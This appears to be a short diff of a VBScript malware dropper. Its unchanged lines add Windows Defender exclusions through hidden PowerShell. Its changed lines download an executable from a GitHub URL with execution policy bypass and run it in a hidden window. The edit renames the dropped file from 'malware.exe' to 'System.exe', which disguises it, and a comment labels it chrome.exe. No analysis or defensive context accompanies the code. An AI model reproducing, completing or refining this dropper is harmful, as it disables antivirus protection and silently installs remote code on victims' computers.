@@ -17,5 +17,5 @@ objShell.Run "powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtensio
 objShell.Run "powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath ""C:\Users""", 0, True
 
 'Download and execute chrome.exe
-objShell.Run "powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/newuser034/powershell1/raw/main/System%20file.exe -o C:\Users\malware.exe", 0, True
-objShell.Run "powershell.exe -w Hidden C:\Users\malware.exe", 0, True
+objShell.Run "powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/newuser034/powershell1/raw/main/System%20file.exe -o C:\Users\System.exe", 0, True
+objShell.Run "powershell.exe -w Hidden C:\Users\System.exe", 0, True
